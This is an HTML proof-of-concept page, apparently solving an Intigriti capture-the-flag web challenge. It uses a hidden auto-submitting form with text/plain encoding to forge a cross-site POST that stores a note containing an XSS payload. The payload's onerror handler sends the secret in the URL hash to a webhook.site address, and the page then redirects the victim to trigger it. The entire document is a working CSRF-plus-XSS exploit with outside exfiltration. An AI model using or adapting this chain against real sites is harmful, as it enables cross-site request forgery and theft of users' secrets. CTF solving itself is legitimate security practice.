<html>
  <body>
    <script>
      // Step 1: Create the note via a hidden form (CSRF)
      const form = document.createElement('form');
      form.action = 'https://challenge-0325.intigriti.io/api/post';
      form.method = 'POST';
      form.enctype = 'text/plain'; // Bypass CORS preflight

      const data = JSON.stringify({
        title: 'Leaky Flag',
        content: '&#x3C;img src="x" onerror="fetch(\\'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=\\' + document.location.hash.substr(3))" /&#x3E;',
        use_password: 'false'
      });

      // Inject JSON into the form body
      const input = document.createElement('input');
      input.name = `{"ignored":1, ${data.slice(1)}`;
      form.appendChild(input);

      // Submit the form silently
      document.body.appendChild(form);
      form.submit();

      // Step 2: Redirect to /notes to trigger the XSS
      setTimeout(() => {
        window.location.href = 'https://challenge-0325.intigriti.io/notes';
      }, 1000);
    </script>
  </body>
</html>
